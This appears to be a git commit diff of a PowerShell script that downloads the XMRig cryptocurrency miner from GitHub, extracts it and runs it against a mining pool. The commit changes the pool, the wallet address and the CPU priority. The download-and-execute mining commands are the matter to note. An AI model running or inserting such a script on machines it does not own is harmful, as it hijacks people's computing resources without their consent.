d1f2e751df42dd98afb2523663213d1432afc048
Thomasleevisua <166501393+Thomasleevisua@users.noreply.github.com>
2024-09-10 02:00:48 -0700

    windows.ps1

--- windows.ps1
+++ windows.ps1
@@ -1,3 +1,3 @@
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip" -OutFile "xmrig.zip"
 Expand-Archive xmrig.zip
-.\xmrig\xmrig-6.21.3\xmrig.exe -o xmrpool.eu:3333 -u 4BCzRFseZPce3GUMsqGEHjeSgzzBhE3C72JdGdapz3kgdWpq4ri7NbNfTKCotSdAP2a6c6f4Qq3XHWRMJX1EYJnrDrSeJG3 --cpu-priority 4
+.\xmrig\xmrig-6.21.3\xmrig.exe -o rx.unmineable.com:3333 -u 8ARyJhJXKiSSoQSMZgoNG87jjNENqwVYaXzdTDFQ1N1JYYKDzrmM8j2Fw1MBTU6bwpGKHut33PKSkPJ1VX71MJrFKq63de5 --cpu-priority 2
